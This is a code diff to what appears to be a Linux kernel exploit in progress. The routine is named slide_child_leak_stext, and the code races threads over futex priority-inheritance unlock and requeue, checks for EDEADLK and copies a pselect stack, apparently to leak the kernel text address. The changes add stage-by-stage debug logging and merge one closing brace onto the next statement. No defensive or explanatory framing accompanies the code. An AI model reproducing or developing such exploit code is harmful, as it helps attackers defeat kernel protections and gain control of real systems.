@@ -624,9 +624,13 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     int entered = atomic_load(&slide_consume_enter_sched) + 1;
     atomic_store(&slide_consume_enter_sched, entered);
     atomic_store(&slide_consume_calls, calls + 1);
+    pr_info("slide stage consumer sched begin tid=%d calls=%d\n",
+            tid, calls);
     *errno_ptr = 0;
     long ret = sched_setattr_tid(tid, (calls % 19) + 1);
     int saved_errno = *errno_ptr;
+    pr_info("slide stage consumer sched done ret=%ld errno=%d\n",
+            ret, saved_errno);
 #if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
     pr_info("slide pselect blocked ready=%d ready_usec=%zu ready_wchan=%s "
             "guard=%d guard_usec=%zu guard_wchan=%s age_usec=%llu tid=%d\n",
@@ -681,19 +685,24 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
     return NULL;
   }
   atomic_store(&slide_waiter_ok, 1);
+  pr_info("slide stage waiter_ok armed\n");
   while (!atomic_load(&slide_deadlock_seen)) {
     __asm__ volatile("yield" ::: "memory");
   }
+  pr_info("slide stage deadlock_seen\n");
   if (futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("slide waiter unlock chain errno=%d\n", errno);
     atomic_store(&slide_route_done, 1);
     return NULL;
   }
+  pr_info("slide stage chain unlocked\n");
   while (!atomic_load(&slide_owner_acquired)) {
     __asm__ volatile("yield" ::: "memory");
   }
+  pr_info("slide stage owner_acquired\n");
 
   slide_pselect_stack_copy();
+  pr_info("slide stage pselect copy returned\n");
   atomic_store(&slide_route_done, 1);
 
   for (;;) {
@@ -825,9 +834,8 @@ uint64_t slide_child_leak_stext(void) {
           requeue_ret, requeue_errno, requeue_polls);
   if (requeue_ret != -1 || requeue_errno != EDEADLK) {
     return 0;
-  }
-  atomic_store(&slide_deadlock_seen, 1);
-
+  }  atomic_store(&slide_deadlock_seen, 1);
+  pr_info("slide stage requeue deadlock seen\n");
   while (!atomic_load(&slide_route_done)) {
     usleep(1000);
   }
